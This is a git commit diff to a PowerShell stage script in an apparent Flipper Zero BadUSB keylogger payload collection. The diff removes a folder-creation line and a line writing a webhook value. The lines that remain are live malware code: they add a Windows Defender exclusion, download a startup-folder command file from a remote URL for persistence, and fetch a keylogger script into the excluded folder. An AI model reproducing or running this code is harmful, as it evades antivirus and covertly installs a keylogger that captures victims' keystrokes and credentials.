4a42decb6bb6f3e4c864ffbe8073509eb11efc35
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-23 12:59:38 -0600

    Update s2.ps1

--- Payloads/Flip-Keylogger/s2.ps1
+++ Payloads/Flip-Keylogger/s2.ps1
@@ -1,8 +1,4 @@
-if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"}
-
 Add-MpPreference -ExclusionPath $env:appdata/-locker
-
-echo $dc > "$env:appdata\-locker\wh.txt"
 
 iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-p.cmd     -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
 iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-keys.ps1  -o "$env:appdata\-locker\-keys.ps1" 
